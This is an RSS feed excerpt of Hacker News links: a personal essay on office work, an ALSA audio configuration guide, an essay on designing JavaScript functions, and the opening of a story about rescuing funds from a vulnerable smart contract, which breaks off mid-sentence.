        <p>I was afraid that in the blink of an eye, my life will be work during the week, and partying on the week ends. Before I know it, three years will have gone by and I'll still be at the same job. I will have forgotten everything about my goals and dreams. My side projects would seem like a very distant dream I can hardly even remember.</p>

        
        <p><i>"Oh, yeah. Back in the day when I used to build little side projects.. Cute."</i></p>
        

        <p>I promised I wouldn't stop working on my personal projects, no matter how tired I am.</p>

        <p>So, yeah.. Picture this.</p>

        <p>A grown ass man crying because he would start a comfy job. At twenty five years of age.</p>

        <p>It's pathetic. I know. But it's the truth. And in this blog post, you'll get nothing but the truth.</p>


        
        

        <p>Luckily, reality was different to my expectations.</p>

        <p>There were no NASA scientists at lunch break. I wasn't saving lives with my code on a casual Tuesday. And I definitely wasn't discussing about AI, side projects or making the world a better place with my colleagues.</p>

        <p>Welcome to reality!</p>

        <p>I was tucked in a corner, with my brand new laptop, programming an internal dashboard for the logistics team.</p>

        <p>Clocking in eight hours per day, plus one hour for lunch break.</p>

        <p>I would enter the building at 10:00 AM and leave at 19:00 PM. That was pitch dark in January/February.</p>

        <p>It was depressing. I wasn't getting close with my colleagues either. All our conversations were at surface level.</p>

        <p>Things were like I had predicted. I had daily fuel and motivation to change my life.</p>

        <p>Initially, I thought that something was wrong with me. That I'm a "special flower", who doesn't like working in an office.</p>

        <p>But no.</p>

        <p>One day, during lunch break, I overheard my colleagues talking about sleep. Somehow the conversation ended up in how lovely it is to lie down in bed on a Friday night. Knowing that you don't have to wake up early for the next two days. And how depressing Sundays are because you know you have to go to work the next day.</p>

        <p>"Ok, so I'm not the only one."</p>

        <p>I'm not the cancerous cell growing inside this company. And I'm not special.</p>

        <p>No one enjoys working on a desk for eight hours a day, five days a week. Week after week. Month after month. Year after year. Decade after decade. No matter how cool the company is or fulfilling it's mission is.</p>

        <p>Most people don't know you can actually escape. Or maybe they don't have the balls to try.</p>

        <p>All I needed was a plan..</p>

        

        

        <p>Hindsight 20-20, but three books I happened to read in December and January helped me shape my approach and strategy.</p>

        

        <p><u>- The Alchemist by Paulo Coelho</u></p>

        <p>This book was short, sweet, and easy to read. It's about a boy that has a dream and works hard for it.</p>

        <p>Bullshit, really. Just a bit of inspiration to keep going.</p>

        

        <p><u>- Atomic Habits</u></p>

        <p>The most practical book I've ever read. It explains how progress happens slowly, then all at once. All you have to do is focus on your inputs/habits and wait for the rewards.</p>

       	

        <p><u>- Millionaire Fastlane</u></p>

        <p>Please, for the love of god, ignore the title! It's cringe as fuck, and I have a really hard time recommending it for that reason. But, if you ignore the title and the first twenty pages of the book where he talks about chicks and lambos, you'll thank me. The principles in the book are timeless and very close to the indiehacking philosophy.</p>

        <p>Three concepts from this book really helped me solidify some raw ideas I had in my mind.</p>

        <p>They deserve chapters of their own.</p>

        


        

        <p>The first concept is that making your passion your job is dangerous.</p>

        <p>It can mix up your incentives and make you hate what you once loved.</p>

        <p>I had personal experience with this. Again, I'm getting dangerously transparent with what I'm about to say, but fuck it.</p>

        <p>I was looking at how many people have photosensitive epilepsy and remember being dissapointed that the market was small.</p>

        <p>Damn it. Couldn't I have built a solution for more people? Couldn't it have been a bigger market?</p>

        <p>I caught myself off guard. What the fuck. My incentives had started getting mixed up before I had even started.</p>

        <p>It's a wonderful thing that so few people have this. Not a negative.</p>

        <p>Now, EpilepsyBlocker is completely free, and always will be. I'm not trying to make it a business, and never will.</p>

        <p>So stop trying to build products that are your "passion". What you want is a business that gives you the freedom to explore your passions and hobbies, without having to worry about making money out of them.</p>

        

        

        <p>The second concept is that you don't have to be unique or try to change the world.</p>

        <p>Trying to change the external, the whole world around you, is a very naive way of thinking.</p>

        <p>What you want is to change your world first, and then the rest of the world.</p>

        <p>Actually, changing yourself is the best way to change the world anyway.</p>

        <p>Heck. If you are so keen like you say you are, do something more boring, make money, and donate like 50% of your income to charities, every month.</p>

        <p>What is better?</p>

        <p>Trying to build a romantic, cool, probably B2C idea to help humanity? Struggle to make a profit and build an average product at best?</p>

        <p>Or build a less romantic, profitable product? One that you enjoy working on? Build a stellar product, make a lot ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.alexwest.co/two_and_a_half_years">https://www.alexwest.co/two_and_a_half_years</a></em></p>]]>
            </description>
            <link>https://www.alexwest.co/two_and_a_half_years</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581041</guid>
            <pubDate>Thu, 24 Sep 2020 17:23:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ALSA, Exposed]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580892">thread link</a>) | @ashitlerferad
<br/>
September 24, 2020 | https://rendaw.gitlab.io/blog/2125f09a85f2.html#alsa-exposed | <a href="https://web.archive.org/web/*/https://rendaw.gitlab.io/blog/2125f09a85f2.html#alsa-exposed">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The clearest ALSA documentation in the universe.</p><a name="alsa-exposed/a-short-essay" href="#alsa-exposed/a-short-essay"><h2><span><span>1</span></span><span>A short essay</span></h2></a><p>ALSA, one of the last great mysteries of Linux, is notoriously hard to use, mostly stemming from the atrocious (read: <strike>almost</strike> entirely nonexistent) end user documentation.</p><p>The internet is scattered with outdated, incorrect, incomplete, confused information written by monkeys at Linux terminals trying random ALSA configs in an attempt to get sound to come out. Being a representative of monkeys myself, I‚Äôve also spent days (that is, multiples of 24 hours) trying to get ALSA to behave sanely.</p><p>I finally jumped into the source, <code>strace</code>d, dug through configs, library documentation, searched my soul and now I‚Äôve cracked this banana! And it‚Äôs actually not bad. Here‚Äôs everything you need to know, once and for all.</p><a name="alsa-exposed/concepts" href="#alsa-exposed/concepts"><h2><span><span>2</span></span><span>Concepts</span></h2></a><a name="alsa-exposed/cards" href="#alsa-exposed/cards"><h3><span><span>2</span><span>1</span></span><span>Cards</span></h3></a><p>Any audio devices (audio chips, USB audio hardware) are considered <code>card</code>s in ALSA.</p><p><code>card</code>s have three identifiers:</p><ul><li><p>Number: This is a number starting from 0 based on the order the kernel found the device. This is useless, because it may be different each boot (and <em>will</em> be different each boot if you plug in and unplug things).</p><p>Edit: gen2brain notes you can control the number using <a href="https://www.reddit.com/r/linux/comments/ixp7my/alsa_exposed/g6alrxx?utm_source=share&amp;utm_medium=web2x&amp;context=3">kernel module options</a></p></li><li><p>ID: This is a (hopefully unique and consistent) text identifier for a card. My built in device has the id <code>Generic</code>.</p></li><li><p>Name: This is another text identifier, but you can‚Äôt use it anywhere. Maybe it will help you identify the device or something‚Ä¶ but don‚Äôt count on it. My built in device has the name <code>HD-Audio Generic</code>.</p></li></ul><p>When referring to cards in config, programs, etc. you can use the number and ID interchangeably.</p><p>See <a href="#alsa-exposed/listing-your-devices">Listing your devices</a> for how to find the identifiers for devices on your system.</p><a name="alsa-exposed/devices" href="#alsa-exposed/devices"><h3><span><span>2</span><span>2</span></span><span>Devices</span></h3></a><p><code>device</code>s are subdivisions of a card. For example, my built in audio device has 3 <code>device</code>s: an analog input + output, a digital output (maybe HDMI?), and an alt analog input. I can configure the analog input and alt input on the device to be microphone-in or line-in independently.</p><p>Same as with <code>card</code>s, <code>device</code>s have three identifiers:</p><ul><li>Number</li><li>ID</li><li>Name</li></ul><p>Unlike the <code>card</code> number, <code>device</code> numbers are generally consistent so feel free to use them in configs and other places.</p><p>See <a href="#alsa-exposed/listing-your-devices">Listing your devices</a> for how to find the identifiers for devices on your system.</p><a name="alsa-exposed/subdevices" href="#alsa-exposed/subdevices"><h3><span><span>2</span><span>3</span></span><span>Subdevices</span></h3></a><p>Device has at least one subdevice. My subdevices are all called ‚Äúsubdevice 0‚Äù. By default subdevice 0 is used everywhere, so you can mostly not worry about this.</p><p>cathexis08 suggested multiple subdevices may be used to <a href="https://www.reddit.com/r/linux/comments/ixp7my/alsa_exposed/g6hvdca?utm_source=share&amp;utm_medium=web2x&amp;context=3">subdivide surround sound systems into areas</a>.</p><a name="alsa-exposed/pcm-pulse-code-modulation" href="#alsa-exposed/pcm-pulse-code-modulation"><h3><span><span>2</span><span>4</span></span><span>PCM (Pulse Code Modulation)</span></h3></a><p>A PCM is an object <em>internal to ALSA</em> that processes audio. PCMs have a (direction) stream which can be playback, capture, or both. PCMs can be chained together, and typically connect to hardware at one end, although they can also be used to route audio to/from a filesystem device, a server, or to drop audio entirely.</p><p>Named PCMs definitions can be templatized, where arguments are provided when they‚Äôre referenced to dynamically define the PCM.  For instance, the built-in <code>hw</code> PCM takes 3 arguments: <code>"hw:CARD,DEVICE,SUBDEVICE"</code> (more details in <a href="#alsa-exposed/default-pcms-and-ctls">Default PCMs and CTLs</a>).</p><a name="alsa-exposed/ctl-control" href="#alsa-exposed/ctl-control"><h3><span><span>2</span><span>5</span></span><span>CTL (Control)</span></h3></a><p>A CTL is an object <em>internal to ALSA</em> processes non-audio data. This is what you see in your mixer: volume controls, toggle controls, multiple-choice selections (like when you can change a device to use different ports), etc.</p><p>You can save and load CTL values using the <code>alsactl</code> CLI and modify the values with <code>alsamixer</code> and other mixing software.</p><p>Like PCMs, CTL definitions can also be templatized.</p><a name="alsa-exposed/slave" href="#alsa-exposed/slave"><h3><span><span>2</span><span>6</span></span><span>Slave</span></h3></a><p>A slave wraps a PCM and allows you to set some audio stream details like bit rate. Generally a slave is just an extra step of indirection to PCM and contains no useful data itself.</p><a name="alsa-exposed/client" href="#alsa-exposed/client"><h3><span><span>2</span><span>7</span></span><span>Client</span></h3></a><p>A client is a piece of software that uses ALSA, via PCMs and CTLs.  Most clients use the default PCM/CTL, but some provide methods for explicitly selecting the PCM/CTL.</p><p>With <code>mpv</code> you can select a PCM named <code>hello</code> with <code>--audio-device=alsa/hello</code>, otherwise it will use the default PCM.  Templatized PCMs also work, like <code>--audio-device=alsa/hw:Generic</code>.</p><p>Similarly, if you have a CTL named <code>dog</code> you can change the levels with <code>alsamixer -D dog</code> (the help text uses the word device incorrectly) and, templatized, <code>alsamixer -D hw:Generic</code>.</p><a name="alsa-exposed/listing-your-devices" href="#alsa-exposed/listing-your-devices"><h2><span><span>3</span></span><span>Listing your devices</span></h2></a><a name="alsa-exposed/with-aplay-arecord" href="#alsa-exposed/with-aplay-arecord"><h3><span><span>3</span><span>1</span></span><span>With <code>aplay</code>/<code>arecord</code></span></h3></a><p>The easiest way to list devices is:</p><p><code>aplay -l
</code></p><p>or</p><p><code>arecord -l
</code></p><p>which produce output like this:</p><p><code>**** List of PLAYBACK Hardware Devices ****
card 1: Generic [HD-Audio Generic], device 0: ALC887-VD Analog [ALC887-VD Analog]
  Subdevices: 0/1
  Subdevice #0: subdevice #0
card 1: Generic [HD-Audio Generic], device 1: ALC887-VD Digital [ALC887-VD Digital]
  Subdevices: 1/1
  Subdevice #0: subdevice #0
</code></p><p>The format is:</p><p><code>card CARD_NUMBER: CARD_ID [CARD_NAME], device DEVICE_NUMBER: DEVICE_ID [DEVICE_NAME]
  ...
  Subdevice #SUBDEVICE_NUMBER: SUBDEVICE_NAME
</code></p><a name="alsa-exposed/from-proc" href="#alsa-exposed/from-proc"><h3><span><span>3</span><span>2</span></span><span>From <code>/proc</code></span></h3></a><p>Alternatively, you can go directly to the <code>/proc</code> tree.</p><a name="alsa-exposed/cards" href="#alsa-exposed/cards"><h4><span><span>3</span><span>2</span><span>1</span></span><span><code>card</code>s</span></h4></a><p>You can list <code>card</code>s with</p><p><code>cat /proc/asound/cards
</code></p><p>This produces output like:</p><p><code> 0 [USB            ]: USB-Audio - Realtek Audio USB
                      Generic Realtek Audio USB at usb-0000:03:00.0-6, high speed
 1 [Generic        ]: HDA-Intel - HD-Audio Generic
                      HD-Audio Generic at 0xf7800000 irq 53
</code></p><p>On the first line, <code>0</code> is the <code>card</code> number, <code>USB</code> (remove trailing spaces) is the <code>card</code> ID, <code>Realtek Audio USB</code> is the <code>card</code> name.  <code>USB-Audio</code> may be <a href="https://www.reddit.com/r/linux/comments/ixp7my/alsa_exposed/g6hvdca?utm_source=share&amp;utm_medium=web2x&amp;context=3">related to the kernel driver</a> providing that device.</p><a name="alsa-exposed/devices" href="#alsa-exposed/devices"><h4><span><span>3</span><span>2</span><span>2</span></span><span><code>device</code>s</span></h4></a><p>Underneath <code>/proc/asound/cardNUMBER/</code> you‚Äôll see nodes like <code>pcm1c/</code> and <code>pcm2p/</code>. <code>1</code> and <code>2</code> are the <code>device</code> number and <code>p</code> or <code>c</code> stands for playback or capture.</p><p>Using my system as an example, <code>cat /proc/asound/card1/pcm0p/info</code> shows:</p><p><code>card: 1
device: 0
subdevice: 0
stream: PLAYBACK
id: ALC887-VD Analog
name: ALC887-VD Analog
subname: subdevice #0
class: 0
subclass: 0
subdevices_count: 1
subdevices_avail: 1
</code></p><a name="alsa-exposed/subdevices" href="#alsa-exposed/subdevices"><h4><span><span>3</span><span>2</span><span>3</span></span><span><code>subdevice</code>s</span></h4></a><p>Underneath <code>/proc/asound/card.../pcm.../</code> you‚Äôll see nodes like <code>sub0</code>, <code>sub1</code>.  <code>0</code> and <code>1</code> are the subdevice numbers.</p><p>In that directory, <code>cat</code> <code>info</code> and other nodes for details.</p><a name="alsa-exposed/configuring-alsa" href="#alsa-exposed/configuring-alsa"><h2><span><span>4</span></span><span>Configuring ALSA</span></h2></a><p>Each client loads <code>/usr/share/alsa/alsa.conf</code> at startup.</p><p>That config defines a number of other configs in <code>@hooks</code> which are all merged together, with later ones overriding earlier ones. On my system this pulls in:</p><ol start="1"><li><code>/etc/alsa.d/*.conf</code> in alphanumeric order</li><li><code>/etc/asound.conf</code></li><li><code>~/.asoundrc</code></li><li><code>~/.config/alsa/asoundrc</code></li></ol><p>If you change the config, you need to restart each ALSA client for the changes to take effect.</p><a name="alsa-exposed/configuration-syntax" href="#alsa-exposed/configuration-syntax"><h3><span><span>4</span><span>1</span></span><span>Configuration syntax</span></h3></a><p>The configuration is a tree, with top level keys:</p><ul><li>pcm</li><li>ctl</li><li>slave_pcm</li><li>timer</li><li>rawmidi</li><li>hwdep</li><li>‚Ä¶</li></ul><p>Each one is a dictionary with key value pairs of names and objects of the given type: <code>pcm</code> contains PCM definitions, <code>ctl</code> of CTL definitions, etc. <code>pcm</code> and <code>ctl</code> are expected to have a key <code>default</code> for clients that don‚Äôt explicitly choose one (most software).</p><p>The config file itself consists of multiple statements of the form:</p><p><code>KEY1.KEY2.KEY3... VALUE
</code></p><p><code>VALUE</code> can be a <code>"string"</code>, a number, a <code>compound</code> - a value that has multiple subproperties, or an absolute (top rooted) reference/alias to another value like <code>pcm.default</code>.</p><p>You can use <code>{</code> <code>}</code> with compounds to avoid writing the whole chain of keys in every statement:</p><p><code>pcm.a.b 4
pcm.a.c "hi"
</code></p><p>is equivalent to</p><p><code>pcm.a {
    b 4
    c "hi"
}
</code></p><p>This is also equivalent:</p><p><code>pcm.a {
    b 4
}
pcm.a {
    c "hi"
}
</code></p><p><code>;</code> and <code>,</code> end statements but they aren‚Äôt necessary. You can also put a <code>=</code> between the key and value if you really want to.</p><a name="alsa-exposed/assignment-modifiers" href="#alsa-exposed/assignment-modifiers"><h4><span><span>4</span><span>1</span><span>1</span></span><span>Assignment modifiers</span></h4></a><p>No values ‚Äúexist‚Äù until you set them in the config, even if there‚Äôs a default value.  Alsa uses knowledge of this ‚Äúexistance‚Äù to raise spurious when loading your config.</p><p>The errors are controlled by modifiers you can prefix on keys, like:</p><p><code>+a "hi"
</code></p><p>The four modifiers are:</p><ul><li><code>+
</code><p>(default if no modifier specified)</p><p>Creates the config value if it doesn‚Äôt exist, and sets it. No config values exist until you specify them, so this is purely determined by other config file statements.</p><p>If the value already exists, the new value must have the same type or else you‚Äôll get an error like:</p><code>ALSA lib conf.c:1446:(parse_def) KEY is not a TYPE
</code><p>For example, if you specify <code>pcm.default</code> instead of <code>pcm.!default</code> you‚Äôll probably see</p><code>ALSA lib conf.c:1446:(parse_def) default is not a compound
</code><p>since it‚Äôs already defined as an alias/reference, not a compound, in the generic packaged configurations.</p></li><li><code>-
</code><p>Sets the value, but doesn‚Äôt create it. If the value doesn‚Äôt exist and you try to set it with this, you‚Äôll get the error:</p><code>ALSA lib conf.c:1432:(parse_def) KEY does not exists
</code></li><li><code>?
</code><p>Only sets the value if it‚Äôs not already set. This is mostly used by package/distro maintainers that are providing default configurations.</p></li><li><code>!
</code><p>Creates, sets, and changes the type of the value.</p></li></ul><p><strong>TLDR</strong>: Just use the default until you get an error and then try <code>!</code>.</p><a name="alsa-exposed/special-statements-and-compounds" href="#alsa-exposed/special-statements-and-compounds"><h4><span><span>4</span><span>1</span><span>2</span></span><span>Special statements and compounds</span></h4></a><p>An <code>@</code> begins a special statement, like <code>@func</code> or <code>@args</code>.  How this works and the syntax seems to differ based on the symbol, so I won‚Äôt provide a general guide.</p><a name="alsa-exposed/arguments" href="#alsa-exposed/arguments"><h5><span><span>4</span><span>1</span><span>2</span><span>1</span></span><span>Arguments</span></h5></a><p>Named PCMs and CTLs can be parameterized to turn them into reusable templates.</p><p>For example, <code>slave.pcm "hw:Dog,5"</code> will instantiate the <code>pcm.hw</code> object as a template, where <code>Dog</code> is the first argument, <code>5</code> is the second, etc.</p><p>Arguments are specified with the special statement <code>@args</code> followed by <code>@arg.NAME</code> for each positional argument given name in the former. I don‚Äôt know the details on this, but you should be able to find examples in <code>/usr/share/alsa/alsa.conf</code> and other config files.</p><a name="alsa-exposed/environment-variables" href="#alsa-exposed/environment-variables"><h4><span><span>4</span><span>1</span><span>3</span></span><span>Environment variables</span></h4></a><p>A compound containing just <code>{ @func getenv vars [ ENVVAR1 ENVVAR2 ... ] default VALUE }</code> will turn into a string from the specified environment variable. Each environment variable is queried and the first to match is used, otherwise <code>VALUE</code>.</p><a name="alsa-exposed/pcm-config" href="#alsa-exposed/pcm-config"><h3><span><span>4</span><span>2</span></span><span>PCM config</span></h3></a><p>A named PCM config is defined as:</p><p><code>pcm.NAME {
    type TYPE
    ...
}
</code></p><p>and referred to like:</p><p><code>{
...
    playback.pcm "NAME"
...
}
</code></p><p>(via the <code>playback</code> slave field), or defined inline without a name like:</p><p><code>{
...
    playback.pcm {
        type TYPE
        ...
    }
...
}
</code></p><p>See more information in <a href="#alsa-exposed/slave-config">Slave config</a>.</p><p>All configuration parameters depend on <code>TYPE</code>. All types are documented with their ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://rendaw.gitlab.io/blog/2125f09a85f2.html#alsa-exposed">https://rendaw.gitlab.io/blog/2125f09a85f2.html#alsa-exposed</a></em></p>]]>
            </description>
            <link>https://rendaw.gitlab.io/blog/2125f09a85f2.html#alsa-exposed</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580892</guid>
            <pubDate>Thu, 24 Sep 2020 17:10:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Crafting Functions]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580885">thread link</a>) | @stopachka
<br/>
September 24, 2020 | https://stopa.io/post/251 | <a href="https://web.archive.org/web/*/https://stopa.io/post/251">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span><p>We write so many functions in our programs that they become second nature before we know it. Like ants in a colony, they are numerous beyond imagination and they come together to form some surprisingly complex systems.</p><p>It begs the question: how do we write good functions? It can seem trivial: they√¢‚Ç¨‚Ñ¢re just like ants after-all. But there is leverage in the answer: the right decisions multiply throughout your codebase and bubble up into great design.</p><p>I think there are about three key ideas you can employ to craft good functions. I wanted to share them with you.</p><p>Let√¢‚Ç¨‚Ñ¢s start with an example. We have an app, and we want to export some data in a JSON format. Here√¢‚Ç¨‚Ñ¢s what a function for that could look like:</p><pre><code>function exportFile() { 
  setLoading(true);
  try {
    const data = getData(); // [Data, Data, Data]
    const exportableData = toExportableData(data); // ExportableData
    const jsonStr = JSON.stringify(exportableData); // '{"data": {...
    const fileURL = saveFile("export.json", jsonStr); // https://foo.com/export.json
    setFileURL(fileURL);
  } finally {
    setLoading(false)
  }
}</code></pre><p>Seems straight forward: To export as JSON, we first get our data. Now, this data may have some sensitive info, so we clean that up and transform into something exportable; ExportableData. Once we have that, we get a string representation, save the file, and badabing, badaboom, we√¢‚Ç¨‚Ñ¢re done. </p><p>Okay, we√¢‚Ç¨‚Ñ¢ve got something working well.</p><p>But life moves on and our program needs to evolve. Instead of just exporting JSON, we need to do more: <strong>we also need to export a CSV file</strong>. </p><p>How do we do that?</p><p>The first thing we notice, is that exporting a CSV is very similar to exporting JSON. Can we abstract <code>exportFile</code>?</p><p>One thing we can do, is to introduce a new flag: something like <code>exportFile(/*isCSV=*/ true)</code> </p><pre><code>function exportFile(isCSV) { 
  ...
  let fileURL
  if (isCSV) { 
    const csvStr = toCSVStr(exportableData)
    fileURL = saveFile("export.csv", jsonStr);
  } else { 
    const jsonStr = JSON.stringify(exportableData);
    fileURL = saveFile("export.json", jsonStr);
  }
  ...</code></pre><p>By introducing this flag, we can conditionally produce a different <code>fileURL</code>: one for CSV and one for JSON. With that we see the first concept for abstraction: configuration. You pass some configuration, and you leave it to your function to figure what to do. </p><p>So, is it a good idea? </p><h2>The key <em>advantage</em> is that our logic is centralized.</h2><p>With configuration, the caller is limited in what they can do: they can only provide flags. All the true logic stays inside <code>exportFile</code>. This means that callers of the function can√¢‚Ç¨‚Ñ¢t go crazy and do something unsupported. And that could give us some peace of mind.</p><h2>The key <em>disadvantage</em> is that√¢‚Ç¨¬¶our logic is centralized.</h2><p>This will work, but let√¢‚Ç¨‚Ñ¢s think about it. First, notice that in order to understand <code>exportFile</code> now, we need to understand both the CSV and JSON case. Imagine if someone opens up <code>exportFile</code> to figure out what it does:  if they <em>only</em> cared about JSON, they now have to understand more logic than they needed. Anyone who changes the logic for CSV, may also end up breaking JSON. <code>**exportFile**</code> <strong>has become</strong> <a href="https://www.infoq.com/presentations/Simple-Made-Easy/" target="_blank"><strong>complected</strong></a><strong>.</strong></p><p>Notice also, that because the caller of this function can <em>only</em> provide flags, their hands are tied for use-cases that you didn√¢‚Ç¨‚Ñ¢t support. This was supposed to give you peace of mind, but it certainly can frustrate callers. imagine if they wanted to support XML, what could they do? They√¢‚Ç¨‚Ñ¢d have to edit <code>exportFile</code> to support this case. (God forbid they edit it to be something like <code>exportFile(isCSV, isXML)</code> √¢‚Ç¨‚Äù now you have invariant conditions on your hands). By being so specific, you√¢‚Ç¨‚Ñ¢ve chosen to make your function less abstract √¢‚Ç¨‚Äù this of course means that it is less powerful.  <code>**exportFile**</code> <strong>has become hard to extend</strong></p><h2>For better or worse, configuration gives the caller the least amount of power</h2><p>If you imagine a sort power spectrum, where the caller has the least power on the left, and most power on the right, configuration would be on the left. You control what the caller does so tightly that it gives your certainty, but makes your function more complex and less useful. </p><p>Say you wanted to address the problems, and move to the right of this spectrum, what could you do? </p><p>Well, if you look at what we wrote, we can notice that the only part that is <em>really</em> different, is the bit about taking <code>exportData</code>, and creating a <code>fileURL</code>. </p><pre><code>...
const exportableData = toExportableData(data); // ExportableData
... // *This can be different! Somehow we need to get a fileURL* 
setFileURL(fileURL);
...</code></pre><p>So one thing we can do is this: instead of providing a flag, we can provide a function: </p><pre><code>function exportFile(exportableDataToFileURL) { 
  setLoading(true);
  try {
    const data = getData(); // [Data, Data, Data]
    const exportableData = toExportableData(data); // ExportableData
    const fileURL = exportableDataToFileURL(exportableData)
    setFileURL(fileURL);
  } finally {
    setLoading(false)
  }
}</code></pre><p>Now, for JSON, we can write </p><pre><code>exportFile((exportableData) =&gt; { 
  return saveFile("export.json", JSON.stringify(exportableData));
})</code></pre><p>and for CSV we can write: </p><pre><code>exportFile((exportableData) =&gt; { 
  return saveFile("export.csv", toCSVStr(exportableData));
})</code></pre><p>Oky doke, this is cool. </p><h2>The key <em>advantage</em> is that you give the caller more power</h2><p>With this we solve both of the problems we had with configuration. Now if someone looks under the hood at <code>exportFile</code>, they won√¢‚Ç¨‚Ñ¢t see unrelated code about csv. If they wanted to extend to XML, they can simply provide a different function. We√¢‚Ç¨‚Ñ¢ve given the caller much more power</p><h2>The key <em>disadvantage</em> is that it can be either too powerful or not powerful enough</h2><p>We√¢‚Ç¨‚Ñ¢ve abstracted further, but there is a price there. The first is, that we <em>think</em> we know that what we <em>really</em> need to pass outwards is <code>exportableData</code>, and what we need to return is a <code>fileURL</code>. What if we were wrong? For example, some may need a slightly different data format √¢‚Ç¨‚Äù instead of <code>exportableData</code> they need <code>someOtherKindOfExportableData</code>. By the time we figured that out, it√¢‚Ç¨‚Ñ¢s possible that there are numerous new usages of <code>exportFile</code>, which we√¢‚Ç¨‚Ñ¢ll have to support as we evolve this function.</p><p>One way we could have prevented this, is to have stuck with configuration. This way, anyone who wanted to support something would have to funnel through this function, which would give us time to think about what the best abstraction was. </p><p>Another way, would have been if this function was abstracted even further, so callers could have easily supported <code>someOtherKindOfExportableData</code>.</p><h2>Inversion lies in the middle of the power spectrum</h2><p>Inversion is more powerful than configuration, but it√¢‚Ç¨‚Ñ¢s not the most powerful method. This can be a great choice, but you risk either being too powerful and exposing errors, or not being powerful enough and restricting callers. </p><p>We know the less powerful option: configuration. What would the most powerful one look like?</p><p>The next thing we may notice, is that our <code>exportFile</code> function is actually built up some building blocks that could be useful for a bunch of different things. For example, many functions may want a loading state, or just need to get <code>exportableData</code>, etc. We could create those building blocks:</p><pre><code>function exportJSONFile() { 
  withLoading(() =&gt; saveJSONFile(getExportableData()))
}


function exportCSVFile() { 
  withLoading(() =&gt; saveCSVFile(getExportableData()))
}</code></pre><h2>The key advantage is that the user gets the most power</h2><p>The building blocks that we just built, can be used in a myriad of ways. The user can support CSV, XML, can use <code>isLoading</code> with some other function, and choose to provide a different kind of <code>exportableData</code>.  We√¢‚Ç¨‚Ñ¢ve provided a lot of power for the user.</p><h2>The key disadvantage is that you are the most vulnerable to mistakes</h2><p>The disadvantage though, like in the case of inversion, is that we open ourselves up to a lot of mistakes. What if <code>isLoading</code> was really meant for files, and other things should have been using a different flag? What if people start using <code>saveJSONFile</code>, and pass data that wasn√¢‚Ç¨‚Ñ¢t really an export? These are all cases that we have implicitly allowed with our abstractions. </p><p>There√¢‚Ç¨‚Ñ¢s a further problem: notice that with our first example of <code>exportFile</code>, you the code was more concrete: you could see what was actually happening. When code is more abstract, it√¢‚Ç¨‚Ñ¢s a bit harder to reason about what is <em>actually</em> happening. Now, it can be worth it for the power gains, but if you optimized prematurely, you√¢‚Ç¨‚Ñ¢re just paying this price for nothing. An example of this unnecessary price is <code>saveJSONFile</code> and <code>saveCSVFile</code> √¢‚Ç¨‚Äù if we had <a href="http://number-none.com/blow/john_carmack_on_inlined_code.html" target="_blank">inlined</a> those, the overall composition would still be abstract but more understandable. These are the kind of things to watch out for as you abstract at this level.</p><h2>Composition is at the end of the spectrum</h2><p>And with that, we see that composition gives us the most power, but gives us the most opportunities to shoot ourselves in the foot. Boy can it be worth it though. </p><p>It√¢‚Ç¨‚Ñ¢s funny to notice that with each option, the pro <em>is</em> the con. So how do we pick? I think one heuristic you can use is this: pick the most powerful option you can limited by your confidence. For example, if you have a light understanding of the problem, stay on the lower side of the abstraction spectrum. As you understand more (say, time to introduce XML) you can evolve to the powerful side of the spectrum. When you√¢‚Ç¨‚Ñ¢re <em>very</em> confident, and you can see good use-cases for your building blocks, lean to the most powerful side of the spectrum. </p><p><em>Thanks to Daniel Woelfel, Alex Reichert, Julien Odent for reviewing drafts of this essay</em></p></span></p></div></div></div>]]>
            </description>
            <link>https://stopa.io/post/251</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580885</guid>
            <pubDate>Thu, 24 Sep 2020 17:09:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Escaping the Dark Forest]]>
            </title>
            <description>
<![CDATA[
Score 304 | Comments 122 (<a href="https://news.ycombinator.com/item?id=24580879">thread link</a>) | @CyrusL
<br/>
September 24, 2020 | https://samczsun.com/escaping-the-dark-forest/ | <a href="https://web.archive.org/web/*/https://samczsun.com/escaping-the-dark-forest/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
<div>
<article>

<figure>
<img srcset="https://samczsun.com/content/images/size/w300/2020/09/109768371_xl.jpg 300w,
                            https://samczsun.com/content/images/size/w600/2020/09/109768371_xl.jpg 600w,
                            https://samczsun.com/content/images/size/w1000/2020/09/109768371_xl.jpg 1000w,
                            https://samczsun.com/content/images/size/w2000/2020/09/109768371_xl.jpg 2000w" sizes="(max-width: 800px) 400px,
                            (max-width: 1170px) 700px,
                            1400px" src="https://samczsun.com/content/images/size/w2000/2020/09/109768371_xl.jpg" alt="Escaping the Dark Forest">
</figure>
<section>
<div>
<p><em>On September 15, 2020, a small group of people worked through the night to rescue over 9.6MM USD from a vulnerable smart contract. This is our story.</em></p><p>I was about to wrap up for the night when I decided to take another look at some smart contracts.</p><p>I wasn‚Äôt expecting anything interesting, of course. Over the past few weeks I had seen countless yield farming clones launch with the exact same pitch: stake your tokens with us and you could be the next cryptocurrency millionaire. Most were simply forks of well-audited code although some tweaked bits and pieces, sometimes with catastrophic results.</p><p>But amidst all of the noise there was some code I hadn‚Äôt seen before. The contract held over 25,000 Ether, worth over 9,600,000 USD at the time, and would be a very juicy payday for anyone who managed to find a bug in its logic.</p><p>I quickly looked through the code for where Ether is transferred out and found two hits. One of them transferred the Ether to a hardcoded token address, so that could be ignored. The second was a burn function that transferred Ether to the sender. After tracing the usage of this function, I discovered that it would be trivial for anyone to mint tokens to themselves for free, but then burn them in exchange for all of the Ether in the contract. My heart jumped. Suddenly, things had become serious.</p><p>Some digging revealed that the contract I had found was part of <a href="https://lien.finance/">Lien Finance</a>‚Äôs protocol. Unfortunately, their team was anonymous! The only 